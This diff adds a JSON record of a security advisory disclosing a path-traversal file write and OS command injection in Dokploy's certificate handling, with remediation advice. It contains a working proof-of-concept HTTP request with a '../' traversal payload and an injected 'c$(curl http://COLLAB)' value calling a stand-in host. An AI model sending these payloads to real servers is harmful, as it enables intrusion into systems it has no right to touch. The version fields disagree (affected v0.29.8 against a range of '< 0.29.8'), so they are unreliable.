@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-q9qw-ch66-5hw3",
+  "repo": {
+    "cve_id": "CVE-2026-72880",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 9.9,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "| | |\r\n|---|---|\r\n| **Affected version** | v0.29.8 (commit `e9a0932b2`) |\r\n| **Component** | `@dokploy/server` - TLS certificate management |\r\n| **Authentication** | Authenticated; requires the `certificate:create`/`delete` permission |\r\n| **Status** | **Arbitrary file write confirmed dynamically.** Remote OS-command-injection variant confirmed by static analysis only (no remote server was available to exercise the `serverId` branch). |\r\n\r\n## 1. Summary\r\nThe certificate model's `certificatePath` is **client-settable** (the Zod create schema does not omit\r\nthe column, and because it has a database default `drizzle-zod` exposes it as an optional input). It is\r\njoined unsanitised into a filesystem path (`path.join(CERTIFICATES_PATH, certificatePath)`) used to\r\n(a) write the certificate/key files and (b) build remote `mkdir`/`rm -rf` shell commands. A `../`\r\nsequence yields an **arbitrary file write** of attacker-controlled content (the certificate body) to\r\nany path the Dokploy process can write. On a certificate bound to a remote server (`serverId`), the\r\nsame value reaches `mkdir -p ${certDir}` / `rm -rf ${certDir}` **unquoted** via `execAsyncRemote` →\r\nOS command injection on that server.\r\n\r\n## 2. Affected code\r\n- **File-write / command sink** - `packages/server/src/services/certificate.ts`\r\n  ```js\r\n  const certDir = path.join(CERTIFICATES_PATH, certificate.certificatePath);   // :88 / :64\r\n  // local branch (fs):\r\n  fs.mkdirSync(certDir, { recursive: true }); fs.writeFileSync(crtPath, certificate.certificateData); ...\r\n  // serverId branch (shell):\r\n  const command = `mkdir -p ${certDir}; echo \"${b64cert}\" | base64 -d > \"${crtPath}\"; ...`;  // :110-117 (unquoted certDir)\r\n  await execAsyncRemote(certificate.serverId, command);\r\n  // removal:\r\n  await execAsyncRemote(certificate.serverId, `rm -rf ${certDir}`);            // :65 (unquoted)\r\n  ```\r\n- **Client-settable field** - `apiCreateCertificate = createInsertSchema(certificates, {...})`\r\n  (`db/schema/certificate.ts:42`) overrides `name`/`certificateData`/`privateKey` but does **not**\r\n  `.omit('certificatePath')`. The column has `.$defaultFn(generateAppName('certificate'))`, so the\r\n  generated input schema treats it as optional and accepts a caller-supplied value (no regex).\r\n\r\n## 3. Authorization / reachability\r\n`certificate.create`/`remove` use `withPermission(\"certificate\", ...)`. The remote OS-command variant\r\nadditionally requires the certificate to be bound to a remote `serverId`.\r\n\r\n## 4. Proof of Concept (Burp) - confirmed arbitrary file write\r\n**Step 0 - Authenticate** (Appendix A). Determine your `organizationId` (returned by any list/create\r\nresponse, or the login response's session).\r\n\r\n**Create a certificate with a traversal `certificatePath`** (the `../` sequence is clamped at `/` and\r\nresolves to `/tmp/poc-cert`, a writable location):\r\n```http\r\nPOST /api/trpc/certificates.create?batch=1 HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nCookie: better-auth.session_token=COOKIE\r\nConnection: close\r\n\r\n{\"0\":{\"json\":{\"name\":\"poc\",\"certificateData\":\"PWNED-CERT-MARKER\",\"privateKey\":\"PWNED-KEY-MARKER\",\"certificatePath\":\"../../../../../../../../../../../../../../tmp/poc-cert\",\"organizationId\":\"ORG_ID\"}}}\r\n```\r\nResponse: `200 OK`, `certificatePath` echoed back verbatim (the field is accepted).\r\n\r\n**Observe (on the host filesystem).** Dokploy writes `chain.crt` (containing `PWNED-CERT-MARKER`),\r\n`privkey.key`, and `certificate.yml` into `/tmp/poc-cert/` - **outside** `CERTIFICATES_PATH`,\r\ndemonstrating attacker-controlled content written to an attacker-chosen path. Reporter's run:\r\n```\r\n/tmp/poc-cert/chain.crt        -> \"PWNED-CERT-MARKER\"\r\n/tmp/poc-cert/privkey.key      -> \"PWNED-KEY-MARKER\"\r\n/tmp/poc-cert/certificate.yml  -> tls.certificates[].certFile: /tmp/poc-cert/chain.crt\r\n```\r\nDeleting the certificate then `rm -rf`s that out-of-bounds directory (the removal side of the same flaw).\r\n\r\n## 5. Remote OS-command-injection variant (static)\r\nFor a certificate created with `serverId` set, supplying e.g.\r\n`certificatePath = c$(curl http://COLLAB)` causes `mkdir -p c$(curl http://COLLAB)` /\r\n`rm -rf c$(curl http://COLLAB)` to run unquoted via `execAsyncRemote` on that server → command\r\nexecution. This branch was not exercised dynamically because the test instance had no remote server\r\nregistered; it follows directly from the same client-settable, unsanitised `certificatePath`.\r\n\r\n## 6. Impact\r\nAttacker-controlled file write to arbitrary host paths (overwrite configuration, drop files into\r\nstartup/cron/web-root locations) as the Dokploy process - a strong primitive that can be escalated to\r\ncode execution. On remote-server-bound certificates, direct OS command injection on the target server.\r\n\r\n## 7. Remediation\r\n- Omit `certificatePath` from the create/update input schemas (server-generate it); never accept it\r\n  from the client.\r\n- Sanitise any path component: reject `..` and absolute paths; confine to `CERTIFICATES_PATH` via\r\n  `path.resolve` + prefix check. Quote/escape values used in remote shell commands or use argument\r\n  arrays.\r\n\r\n## Appendix A - Authentication\r\n```http\r\nPOST /api/auth/sign-in/email HTTP/1.1\r\nHost: TARGET\r\nContent-Type: application/json\r\nConnection: close\r\n\r\n{\"email\":\"USER@EXAMPLE.COM\",\"password\":\"PASSWORD\"}\r\n```",
+    "ghsa_id": "GHSA-q9qw-ch66-5hw3",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-q9qw-ch66-5hw3",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-q9qw-ch66-5hw3"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72880"
+      }
+    ],
+    "published_at": "2026-07-21T23:23:53Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Arbitrary File Write + Remote OS Command Injection via `certificatePath`",
+    "updated_at": "2026-08-10T19:16:14Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "Dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "< 0.29.8 "
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
